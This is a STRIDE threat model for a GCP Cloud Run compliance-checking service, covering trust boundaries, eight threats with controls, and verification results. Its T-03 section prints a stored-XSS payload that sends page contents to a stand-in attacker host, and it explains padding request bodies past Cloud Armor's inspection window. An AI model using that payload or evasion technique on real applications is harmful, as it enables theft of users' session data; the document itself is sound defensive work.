# Threat Model: Aegis Compliance Checkpoint

**Status:** Accepted for Session 1. Re-validate after Sessions 2 and 3.
**Scope:** `aegis-prod-0926`, `me-central1`. The service, its edge, its identities, its build path.
**Method:** STRIDE applied per trust boundary.
**System version:** app `v0.1.0` (`fb8aef7`). No infrastructure is applied yet, so every infrastructure
control below is a commitment to Session 2 or 3, not an observation. Section 9 separates the two.

## 1. Assets

| Asset | Classification | Where it lives |
|---|---|---|
| A1 Submitted configuration (project IDs, SA emails, IAM bindings, key names) | **Confidential, client-owned** | Transit and process memory only |
| A2 Assessment findings (which controls a client fails) | **Confidential, client-owned** | Response body, browser DOM |
| A3 Control baseline (13 rules) | Internal | Container image |
| A4 Runtime secrets (Session 3) | **Secret** | Secret Manager, process env |
| A5 Deployment identities (WIF pool, CI SA, runtime SA) | **Secret-equivalent** | GCP IAM |
| A6 Analyst identity | **PII** | IAP, Cloud Audit Logs |
| A7 Logs | Internal | Cloud Logging |

**Aegis persists nothing.** No database, cache, bucket, or session state. A1 and A2 exist for the life
of one request. That collapses most of the confidentiality surface before any control is applied, and
leaves transit, memory, and **logs** as the exposure. Hence T-05.

**Absences verified in source, because each removes a STRIDE branch:**

| Absent | Evidence | Removes |
|---|---|---|
| No SQL/database | No driver in `app/requirements.txt` | SQL injection |
| No input-driven outbound calls | No network calls in `app/src/engine.py` | SSRF |
| No user data in server-side templates | `app/src/main.py:44-59` passes rule metadata only | SSTI |
| No unsafe deserialisation of input | `yaml.safe_load` on image-resident files only | YAML/pickle RCE |
| No auth or session logic | No middleware, no cookies issued | Broken auth logic. Deliberate: see T-02 |

## 2. Shared responsibility

Google owns hardware, host OS, container runtime, autoscaling, and network substrate; nothing below the
container image is in scope
([source](https://cloud.google.com/architecture/framework/security/shared-responsibility-shared-fate)).
Owned here: image contents and their supply chain, Cloud Run configuration (ingress, invoker IAM,
runtime SA, egress), every IAM binding, edge configuration, key and secret lifecycle, application
behaviour including what it renders and logs, and the DNS records that point at the load balancer, which
in this design live in **another cloud**.

## 3. Data flow

```
        ┌────────────────────────────────────────────────────────────────────┐
        │  AWS account: separate cloud, separate IAM, separate MFA policy     │
        │  Route 53 public hosted zone                                        │
        │     aegis.<domain>.   A   ->   <GCP global external IPv4>           │
        │  No Cloud DNS zone exists. GCP does not control this record.        │
        └───────────────────────────────┬────────────────────────────────────┘
                                        │ (1) resolution + Google domain-control
                                        │     validation for cert issue/renewal
   ═══════ TB-6  cross-cloud name resolution ════════════════════════════════════
                                        │
   ┌─────────────┐                      ▼
   │   Analyst   │   (2) HTTPS 443   ┌──────────────────────────────────────┐
   │  (browser)  │──────────────────►│  Google Front End                    │
   │             │                   │  global external Application LB      │
   └─────────────┘                   │    · Google-managed SSL certificate  │
        ▲                            │    · SSL policy, TLS 1.2 minimum     │
        │                            │    · Cloud Armor: OWASP preconfig    │
        │ (9) findings JSON,         │      rules + rate limiting           │
        │     rendered in the DOM    └──────────────────┬───────────────────┘
        │                                               │ (3)
   ═════╪═══ TB-7 browser DOM ══════   ═══════ TB-1 ════╪═══ public internet edge
        │                                               │
        │                            ┌──────────────────▼───────────────────┐
        │                            │  Identity-Aware Proxy                │
        │                            │    Google sign-in                    │
        │                            │    roles/iap.httpsResourceAccessor   │
        │                            └──────────────────┬───────────────────┘
        │                                               │ (4) + x-goog-iap-jwt-assertion
   ══════ TB-2 unauthenticated → authenticated ══════════│═════════════════════
   ══════ TB-3 Google edge → tenant workload ════════════│═════════════════════
        │        (the same hop, two different questions) │
        │                            ┌──────────────────▼───────────────────┐
        └────────────────────────────│  Cloud Run service: aegis            │
                                     │   ingress = INTERNAL_AND_CLOUD_LB    │
                                     │   invoker = LB/IAP identity only     │
                                     │   verifies IAP JWT (D2)              │
                                     │   runtime SA = dedicated, not default│
                                     │   direct VPC egress (D3)             │
                                     │   distroless image, uid 65532        │
                                     │   STATELESS: no store of any kind    │
                                     └───┬───────────────┬──────────────┬───┘
                                         │ (5)           │ (6)          │ (7)
   ══════ TB-4 workload identity → managed data services ═══════════════════════
                                         │               │              │
                          ┌──────────────▼──┐  ┌─────────▼────┐  ┌──────▼──────┐
                          │ Secret Manager  │  │  Cloud KMS   │  │Cloud Logging│
                          │ scoped per      │  │  CMEK, 90d   │  │ + Monitoring│
                          │ secret          │  │  rotation    │  │ metadata    │
                          └─────────────────┘  └──────────────┘  └─────────────┘

   ┌──────────┐            ┌─────────────────────────────────────────────────┐
   │ Developer│─ git push ►│ GitHub Actions, OIDC token                      │
   └──────────┘            └──────────────────────┬──────────────────────────┘
                                                  │ (10) OIDC assertion
   ═══════ TB-5 external CI identity → GCP control plane ═════════════════════
                                                  │
                           ┌──────────────────────▼──────────────────────────┐
                           │ WIF pool. Provider attribute_condition binds    │
                           │ repository AND ref. No service account keys.    │
                           └──────────────────────┬──────────────────────────┘
                                                  │ (11) short-lived token
                        ┌─────────────────────────┼──────────────────────┐
                        ▼                         ▼                      ▼
              ┌──────────────────┐      ┌──────────────────┐   ┌───────────────┐
              │ Artifact Registry│─(12)►│ Cloud Run deploy │   │ TF GCS backend│
              │ Docker, CMEK     │      └──────────────────┘   └───────────────┘
              └──────────────────┘
```

| TB | Boundary | Enforcement |
|---|---|---|
| TB-1 | Public internet → Google edge | Cloud Armor, SSL policy |
| TB-2 | Unauthenticated → authenticated | IAP + Google sign-in |
| TB-3 | Google edge → tenant workload | Cloud Run ingress + invoker IAM + IAP JWT verification |
| TB-4 | Workload identity → managed data services | Per-resource IAM bindings |
| TB-5 | External CI identity → GCP control plane | WIF provider attribute condition |
| TB-6 | AWS Route 53 → GCP load balancer | **Outside GCP IAM entirely** |
| TB-7 | Server response → browser DOM | Output encoding, CSP |

TB-6 and TB-7 are absent from the brief. Both come from real decisions in this project: hosting DNS in
AWS, and rendering evidence client-side.

| # | Flow | Data | Note |
|---|---|---|---|
| 1 | Resolver → Route 53 | Hostname → LB IP | Also the cert renewal validation path |
| 2 | Browser → GFE | A1 in POST body | TLS terminates at the GFE |
| 3 | GFE → IAP | Request + client attributes | Post-WAF |
| 4 | IAP → Cloud Run | Request + `x-goog-iap-jwt-assertion` | Client-supplied `x-goog-*` headers stripped by IAP |
| 5 | Cloud Run → Secret Manager | A4 | Runtime SA, per-secret binding |
| 6 | Cloud Run → Cloud KMS | Key operations | Indirect, for Artifact Registry CMEK |
| 7 | Cloud Run → Cloud Logging | A7 **metadata only** | `app/src/main.py:70-76` logs counts and score, never A1 |
| 8 | Cloud Run → internet | None in normal operation | Default-deny. That this path exists at all is the concern |
| 9 | Response → browser DOM | A2 containing echoed A1 values | Rendered via `innerHTML`. See T-03 |
| 10-12 | GitHub → STS → CI SA → registry → revision | Image, new revision | The path by which code becomes production |

## 4. Threats

### T-01 · Direct workload invocation bypasses the entire edge
**S, E · TB-3 · L:High I:High · Residual: Low**

The `*.run.app` URL is not secret: it appears in Terraform outputs, `gcloud run services list`, and SCC
findings. A direct call to `POST /v1/check` skips Cloud Armor and the SSL policy. Highest likelihood in
this model because it needs no exploit, only a hostname.

**Revised control (supersedes the original ingress+invoker design, see `Docs/IAP-Placement.md`).** IAP is
enabled directly on the Cloud Run service (`iap_enabled = true`), not on the LB backend service.
Google: *"Protects the `run.app` endpoint directly... If you opt to place a load balancer in front of
Cloud Run, the load balancer's endpoint is also protected"*
([source](https://docs.cloud.google.com/iap/docs/enabling-cloud-run)). Mechanically, `ingress` is left at
`INGRESS_TRAFFIC_ALL`; the actual gate is IAM, `roles/run.invoker` is held only by IAP's own service
agent, so no caller, direct hostname or any load balancer, can invoke the container without passing
IAP first.

**O-1 resolved.** The original concern was whether `INGRESS_TRAFFIC_INTERNAL_AND_CLOUD_LOAD_BALANCING`
admits a load balancer from another project, which would matter if invoker IAM were the only thing
stopping it. Moot now: ingress is `ALL`, and the invoker binding is scoped to IAP's service agent
regardless of which LB (if any) originates the request. A third party fronting this service with their
own LB still can't get an invocation past IAM.

**`default_uri_disabled` (D4) retired**, not deferred. It existed to remove the `run.app` endpoint
because, under the original design, that endpoint was reachable without passing IAP. Under the current
design `run.app` is already behind IAP, so there's nothing left to remove.

**Validated by.** `curl https://<service>.run.app/health` returns IAP's sign-in redirect or a 403, not a
raw Cloud Run response, confirming `run.app` is behind IAP rather than merely ingress-filtered. Same
result through the LB path.

### T-02 · The application cannot distinguish an IAP-authenticated request from a direct one
**S · TB-2/3 · L:Low I:High · Residual: Low (was Medium before D2)**

The app has no middleware and no identity handling, so it serves anything reaching its socket. Correct
only while T-01 holds perfectly and forever. If IAP is disabled during an incident, or a revision ships
with `ingress = all`, the app cannot notice: it keeps returning 200s and its logs cannot separate an
authenticated analyst from an anonymous caller.

**Reasoning, not a documented guarantee, on the "IAP disabled" branch of this threat.** Under the current
D1 (IAP directly on Cloud Run), the only principal ever granted `roles/run.invoker` is IAP's own service
agent, a Terraform-managed binding independent of the `iap_enabled` flag. Disabling IAP removes the proxy
that authenticates as that identity; it does not grant `run.invoker` to anyone else. So the likely failure
mode of "IAP disabled" is the service becoming uninvokable, not the service becoming open, unless a
second, separate IAM change (a new invoker binding, `allUsers`) ships alongside it. Google's docs do not
state this outcome explicitly, it follows from the IAM model, not from a cited guarantee, so T-02's
control (D2) still stands: `ingress = all` shipping with a stray invoker binding is exactly the scenario
this section exists for, and the app has no way to detect it on its own.

**Control (decision D2).** Verify `x-goog-iap-jwt-assertion`, env-gated on `IAP_AUDIENCE`. Google
documents this as the answer: "Signed headers provide secondary security in case someone bypasses IAP",
and without it "an attacker can forge the IAP unsigned identity headers,
`x-goog-authenticated-user-{email,id}`" ([source](https://docs.cloud.google.com/iap/docs/signed-headers-howto)).

This does not breach the "no auth in the app" boundary: signature verification makes no access decision
and holds no user model. It is the app declining to trust an unauthenticated network path, which is the
fail-closed principle in `Docs/Fail-Closed-Evaluation.md` applied to authentication. **Trade-off:** adds
`google-auth` to a five-dependency app; env-gating preserves zero-credential local dev.

**Validated by.** Forged `x-goog-authenticated-user-email` to the Cloud Run URL is rejected.
**Audience format, confirmed against current docs, not deploy-time guesswork:** the `aud` claim format
depends on where IAP sits and the two are not interchangeable
([source](https://docs.cloud.google.com/iap/docs/signed-headers-howto)):
```
IAP on a backend service (old D1):   /projects/PROJECT_NUMBER/global/backendServices/SERVICE_ID
IAP on Cloud Run directly (D1, current): /projects/PROJECT_NUMBER/locations/REGION/services/SERVICE_NAME
```
`IAP_AUDIENCE` must be built from the second format. Using the first will fail closed against a valid,
correctly-signed IAP token, silently, since the failure looks identical to "IAP is broken" rather than
"the app is checking the wrong string."

### T-03 · Client-supplied configuration executes as script in the analyst's browser
**T, E · TB-7 · L:Medium I:Medium · Residual: Medium now, Low after fix 1**

**Confirmed by execution against `v0.1.0`, not inferred.** `resolve_field`
(`app/src/engine.py:16-23`) returns the submitted value verbatim into `evidence.actual`, and
`app/templates/index.html:725` concatenates it into `.innerHTML`. `escHtml` exists at line 562 but is
wired only to the editor highlighter.

```
payload: <img src=x onerror=fetch('https://attacker.example/'+document.body.innerText)>
returned verbatim, unescaped: True     any HTML escaping applied: False
```

Delivery is the product's own workflow: "run our config through your baseline" is both the normal
request and the attack. Execution lands in an IAP-authenticated origin and can exfiltrate every
assessment run in that session, including other clients' A1 and A2.

**Why the WAF is not the control.** Three documented reasons that compound:
1. Inspection is bounded: "preconfigured WAF rules can only inspect up to the first 64 kB (either 8 kB,
   16 kB, 32 kB, 48 kB, or 64 kB) of a request body"
   ([source](https://docs.cloud.google.com/armor/docs/configure-waf)). A **200,029-byte body was
   accepted and fully evaluated, HTTP 200**: three times the maximum window, so a padded tail escapes
   inspection at any setting.
2. JSON parsing is off by default: "By default, this option is disabled", and without it Cloud Armor
   "may fall back to processing the entire body as a single URL-encoded string"
   ([source](https://docs.cloud.google.com/armor/docs/content-parsing)). Needs `--json-parsing STANDARD`.
3. The script executes from the **response**. A request-side WAF inspects the wrong direction for a DOM
   sink.

**Controls.** (1) Escape in `fmt()` or assign via `textContent`. This is the fix. (2) CSP, whose real
cost is that `index.html` has inline `<style>`/`<script>`, so it needs nonces or extraction. (3) Cloud
Armor XSS rules with JSON parsing and an explicit inspection size, as defence in depth only. (4) Request
size cap below the inspection limit, which makes control 3 complete for bodies the service accepts.

**Validated by.** Submit the payload: literal string displayed, not executed. Separately submit it
padded past the inspection limit to demonstrate why the WAF is not relied on.

### T-04 · Unbounded evaluation becomes a billing event
**D · TB-1/3 · L:Medium I:Medium · Residual: Medium**

`config` is an unconstrained `dict` (`app/src/schemas.py:24`): no size, depth, or key-count limit.
Confirmed, a 200 KB body is accepted and evaluated. On Cloud Run the consequence is not downtime but
**instance count, which converts to spend**. On a trial balance, budget exhaustion is the outage, and it
takes the project down rather than one endpoint.

**A cheaper error path, confirmed.** CR-004 applies `gte` to `tls_min_version` via `float(actual)`
(`app/src/engine.py:12`). The entirely plausible value `"TLSv1.2"` returns **HTTP 500**, as do a list or
dict. One small request per error, no volume needed. Primarily a robustness bug, filed here because
error rate is what the Session 3 log-based alert watches: a trivially reachable 500 makes that alert
noisy or trains its reader to ignore it.

**Controls.** (1) IAP, the dominant control and it deserves the credit: the attacker must first hold an
identity explicitly granted `roles/iap.httpsResourceAccessor`, which reduces the internet to a named
allowlist. (2) Cloud Armor rate limiting. (3) `max_instance_count`, the actual cost ceiling. (4) Body
size cap. (5) Billing budget alert as the detection layer.

**Residual.** An authorised analyst can still degrade the service. Rate limiting shapes traffic but does
not bound the cost of one expensive request. Accepted: known user set, and (3) bounds the worst case to
a number chosen in advance.

### T-05 · Client configuration leaks into logs
**I · TB-4 · L:Low I:High · Residual: Low**

A stateless service has one way to accidentally persist A1: logging. The code is already correct
(`app/src/main.py:70-76` logs `resource_type`, counts, and score; never the config).

**Initial hypothesis, tested and refuted.** I claimed the unhandled-exception path (reachable, see T-04)
carries A1 into logs.

| Question | Result |
|---|---|
| Does the 500 response echo the submitted value? | **No.** Generic `Internal Server Error` |
| Does the value appear in the emitted traceback? | **No.** CPython prints source lines, not locals |

So the exception path is an availability defect, not a disclosure one, **on default settings**.
Disclosure materialises only if Starlette debug mode is enabled, which renders locals into the response,
or if someone later logs the offending value to ease debugging. Both are one careless commit away, which
is why control 2 is worth having in advance.

**Controls.** (1) Metadata-only logging, implemented and verified. (2) Exception handler logging type
and rule ID only, plus an explicit assertion that debug mode is off in the deployed config. (3)
Deliberate log retention. (4) Data Access audit logs on Secret Manager and KMS. (5) No project-level
`roles/logging.viewer` for humans.

**Residual.** LB logs record URLs, methods, status codes; A1 travels in a POST body so it does not
appear there. Not zero: assessment metadata frequency is mildly revealing, and A6 is genuinely retained
by IAP and audit logs, which is intended and is why retention is control 3.

**Validated by.** Submit a canary string, query all log buckets, expect zero hits. Repeat after forcing
an evaluation exception.

### T-06 · Compromised CI identity deploys attacker code
**E, T · TB-5 · L:Medium I:Critical · Residual: Medium**

Flow 12 is how code becomes production; whoever controls it owns the service and inherits the runtime
SA's access to A4. Three routes: (a) an over-permissive WIF provider whose `attribute_condition` omits
the repository, or binds only `assertion.repository_owner`, letting **any** GitHub workflow mint a token
for this project's SA with no repository compromise at all; (b) `pull_request_target` on a fork PR,
which runs untrusted code with the federated identity available; (c) a third-party action on a mutable
tag running in the same job as the token exchange.

Aegis's own IAM-003 checks this class of problem, so getting it right here is not optional.

**Controls.** (1) `attribute_condition` binding repository **and** ref. This single expression is the
control. (2) Deploy-scoped CI SA, no `roles/editor` or `roles/owner`. (3) No SA keys, verified by
GitLeaks over full history. (4) Triggers limited to `push` on `main`. (5) Actions pinned to commit SHAs.
(6) Log-based alert on Cloud Run admin activity.

**Residual.** A commit to `main` by a legitimate identity deploys. Single-author repository, so branch
protection cannot manufacture a second reviewer. Accepted explicitly: the compensating control is
detection (6), not prevention.

**Validated by.** `gcloud iam workload-identity-pools providers describe` shows the repository-scoped
condition; a token exchange from a different repository is denied.

### T-07 · Compromised base image or dependency executes in the container
**T · TB-5/3 · L:Low I:High · Residual: Medium**

Compromise of `python:3.11-slim`, the distroless runtime, or any of five pinned dependencies yields
execution inside a container holding the runtime SA's credentials.

**Rule files are code-equivalent.** `evaluate_rule` calls `importlib.import_module(rule["handler"])`
(`app/src/engine.py:67`) on a path read from YAML. Not a runtime injection point, since rules ship in
the image, but write access to `app/src/rules/*.yaml` is write access to the Python import path. That
belongs to supply chain, not input validation.

**Controls.** (1) Distroless, implemented; reasoning in `Docs/Distroless-Container.md`. Removes the
commodity post-exploitation toolchain rather than preventing execution. (2) Trivy failing on CRITICAL.
(3) Bandit SAST. (4) Artifact Registry CMEK.

**Residual is higher than the control list suggests**, and both gaps are visible in `app/Dockerfile`:
base images pinned by **tag, not digest**, so two builds of one commit can differ; dependencies pinned
by **version, not hash**, which stops drift but not a compromised release. No image signing and no
Binary Authorization, so nothing at admission verifies that the image Cloud Run runs is the image the
pipeline built. Accepted for this scope, recorded as the next hardening step rather than claimed covered.

**Validated by.** Introduce a known-CVE dependency, confirm Trivy fails the pipeline, remove, confirm it
passes.

### T-08 · DNS control lives in another cloud, upstream of every GCP control
**S, D · TB-6 · L:Low I:High · Residual: Medium, accepted**

Exists because of a decision in this project, not the brief. The authoritative zone is a Route 53 hosted
zone in an AWS account; no Cloud DNS zone exists. Compromise of that account, the zone, or the registrar
repoints the A record. Two effects:

1. **Traffic capture.** Cloud Armor, IAP, the SSL policy, and the ingress restriction are all downstream
   of resolution and provide **zero** protection. The analyst sees a familiar hostname and is invited to
   paste a client configuration into attacker infrastructure.
2. **Certificate denial of service**, the one people miss. Managed certs revalidate domain control at
   renewal. Records must "point *only* to the IP address (or addresses) associated with the load
   balancer's forwarding rule", and "if the validation process fails, Google-managed certificates fail to
   renew. As a result, your load balancer serves an expired certificate to clients"
   ([source](https://docs.cloud.google.com/load-balancing/docs/ssl-certificates/google-managed-certs)).
   Altering the record does not merely redirect traffic, it starts a countdown to a hard TLS outage that
   no GCP-side action can fix.

**Controls, and the substance of the finding is that all but one live in AWS.** (1) MFA on the AWS
account, no long-lived keys with Route 53 write. (2) Registrar transfer lock. (3) DNSSEC on the zone.
(4) GCP side: monitor certificate state so a failed renewal alerts rather than surfacing as a browser
error weeks later.

**Residual.** The price of a split control plane. One Terraform state, one IAM model, and one audit log
would all be stronger, and moving the zone to Cloud DNS would achieve that. The decision was taken for
reasons outside this model; the consequence is documented rather than absorbed silently.

## 5. Summary

| ID | Threat | STRIDE | TB | L | I | Residual |
|---|---|---|---|---|---|---|
| T-01 | Direct invocation bypasses the edge | S,E | 3 | High | High | **Low** |
| T-02 | App cannot distinguish IAP-authenticated requests | S | 2,3 | Low | High | **Low** |
| T-03 | Config values execute as script in the browser | T,E | 7 | Med | Med | **Medium** |
| T-04 | Unbounded evaluation becomes a billing event | D | 1,3 | Med | Med | **Medium** |
| T-05 | Client configuration leaks into logs | I | 4 | Low | High | **Low** |
| T-06 | Compromised CI identity deploys attacker code | E,T | 5 | Med | Crit | **Medium** |
| T-07 | Compromised base image or dependency | T | 5,3 | Low | High | **Medium** |
| T-08 | DNS control lives in another cloud | S,D | 6 | Low | High | **Medium** |

No threat carries a residual of "none". Four of eight stay Medium after treatment, with reasons stated
rather than averaged away.

## 6. Excluded, with reasons

| Threat | Why |
|---|---|
| SQL injection | No database, no SQL. `sqli-v33-stable` will run because it is free, but it mitigates nothing here and claiming otherwise would inflate the control set |
| Cloud DLP | DLP scans data at rest. There is no store, bucket, or table to scan. Deliberately unjustified, per the brief's own guidance |
| SSRF | No outbound calls, and no user value reaches a network call |
| SSTI | Jinja renders rule metadata and the request only. Config returns as JSON and renders client-side, which is T-03 |
| Unsafe deserialisation | `yaml.safe_load` on image-resident files; user input is parsed by Pydantic |
| Multi-tenant isolation | Single-tenant internal tool. No tenant boundary exists |
| Insider threat, platform admin | Sole administrator. Separation of duties is unachievable in a single-author project; pretending otherwise produces a control nobody performs. Compensating control is audit logging |
| Volumetric DDoS | Absorbed by Google's edge as a platform property. Not owned per section 2. Application-layer flooding is in scope as T-04 |

## 7. Assumptions

1. Analysts are few, known, and individually granted IAP access. If Aegis became externally facing,
   T-04's likelihood rises sharply and T-02 stops being a second-line concern.
2. Configurations may contain sensitive identifiers but not regulated personal data. If that changes,
   DLP moves from excluded to required and section 6 must be redone.
3. `me-central1` supports every service in the diagram. Cloud Run is confirmed and Tier 2 priced
   ([source](https://docs.cloud.google.com/run/docs/locations)). Direct VPC egress and IAP availability
   there are **assumed and must be confirmed in Session 2**; a gap forces a region or design change.

## 8. Open items

| # | Item | Why it matters | Resolves |
|---|---|---|---|
| O-1 | ~~Does `internal-and-cloud-load-balancing` admit LBs from other projects?~~ **Resolved** | Moot once IAP moved onto Cloud Run directly: ingress is `ALL`, invoker IAM is scoped to IAP's service agent regardless of which LB originates the call | T-01, `Docs/IAP-Placement.md` |
| O-2 | Cloud Armor's default body inspection size | Two Google pages disagree: one states 8 kB, the other implies 64 kB. Only the set (8/16/32/48/64 kB) and the 64 kB max are established. Secondary in practice, since the app accepts 200 KB bodies and a tail escapes at any setting until a size cap exists | Read the deployed policy after apply |
| O-3 | Direct VPC egress support in `me-central1` | A gap forces the Serverless VPC Access connector back and reopens D3 | Session 2 |

**Decided in Session 1:** IAP on the LB backend service, not direct on Cloud Run (D1, ADR). IAP JWT
verification in the app, env-gated (D2, T-02). Direct VPC egress over a connector (D3, ADR), which
required rewriting NET-001 to assert the outcome rather than the mechanism. `default_uri_disabled`
sequenced after evidence capture (D4, T-01).

**Revised in a later session:** D1 reversed, IAP moved directly onto Cloud Run; the two placements are
mutually exclusive by design and IAP-on-Cloud-Run covers the LB path too, closing O-1. D4
(`default_uri_disabled`) retired as a consequence, there's no `run.app` bypass left to close. Full
reasoning in `Docs/IAP-Placement.md`.

## 9. Verification performed

| Claim | Method | Result |
|---|---|---|
| T-03: values return unescaped in `evidence.actual` | Executed `POST /v1/check` with an HTML payload | **Confirmed.** Byte-identical, no escaping |
| T-03: value reaches an `innerHTML` sink | Code read, `index.html:725` | Confirmed by inspection. Browser execution not separately driven |
| T-03/04: app accepts bodies beyond any WAF window | Executed with 200,029 bytes | **Confirmed.** HTTP 200, fully evaluated |
| T-04: ordinary input forces a 500 | Executed `{"tls_min_version": "TLSv1.2"}` plus list/dict | **Confirmed.** HTTP 500 on all three |
| T-05: 500 response echoes the value | Executed, searched response | **Refuted.** Generic error |
| T-05: traceback carries the value into logs | Executed, searched output | **Refuted** on default settings. Conditional on debug mode |
| T-05: logs carry metadata only | Code read plus observed log lines | Confirmed |
| T-01, T-02, T-06, T-07, T-08 | Documentation and code review | **Not empirically verified.** No infrastructure exists yet; verified in Sessions 2 to 4 |

Two hypotheses did not survive testing, both in T-05. Recorded as refuted rather than deleted, because
the reasoning that produced them is the reasoning a later reviewer would repeat.

**Actions falling out of verification:**

| Finding | Resolution | Status |
|---|---|---|
| Evidence renders unescaped into the DOM (T-03) | `fmt()` escapes before returning; both call sites are element content, so escaping `& < >` is sufficient. The API still returns the raw value, because escaping belongs at the render boundary, not in the data contract | **Fixed** |
| `gte` on an unparseable value returns 500 (T-04) | `_gte` catches `TypeError`/`ValueError` and fails the control closed. `{"tls_min_version": "TLSv1.2"}` now returns 200 with CR-004 FAIL and the offending value as evidence | **Fixed** |
| No request size limit (T-03, T-04) | Cap below the Cloud Armor inspection limit | **Deferred to Session 2**, because the limit and the `--request-body-inspection-size` setting must be chosen together |

CSP for T-03 control 2 remains open: `index.html` carries inline `<style>` and `<script>`, so it needs
nonces or extraction. Sequenced with the Session 2 edge work.

## 10. Transferable principle

Every control here sits on a chain, and a chain has an order. Cloud Armor cannot inspect a request that
never reaches it (T-01). IAP cannot authenticate a caller the application never asks about (T-02). A
request-side WAF cannot sanitise a response-side sink (T-03). None of these are failures of the
individual controls; each works exactly as documented. They are failures of **position**.

So the useful review question is not "is this control present?" but "what is upstream of it, and what
happens downstream when that upstream link is removed?" Asked consistently, it produced T-01, T-03, and
T-08, which are the three entries a generic STRIDE pass would have missed.

## Sources

- [Restrict network ingress for Cloud Run](https://docs.cloud.google.com/run/docs/securing/ingress)
- [Enable IAP for Cloud Run](https://docs.cloud.google.com/iap/docs/enabling-cloud-run)
- [IAP signed headers](https://docs.cloud.google.com/iap/docs/signed-headers-howto)
- [Cloud Armor security policy overview](https://docs.cloud.google.com/armor/docs/security-policy-overview)
- [Cloud Armor: preconfigured WAF rules](https://docs.cloud.google.com/armor/docs/configure-waf)
- [Cloud Armor: request body content parsing](https://docs.cloud.google.com/armor/docs/content-parsing)
- [Google-managed SSL certificates](https://docs.cloud.google.com/load-balancing/docs/ssl-certificates/google-managed-certs)
- [Cloud Run locations](https://docs.cloud.google.com/run/docs/locations)
- [GCP shared responsibility model](https://cloud.google.com/architecture/framework/security/shared-responsibility-shared-fate)
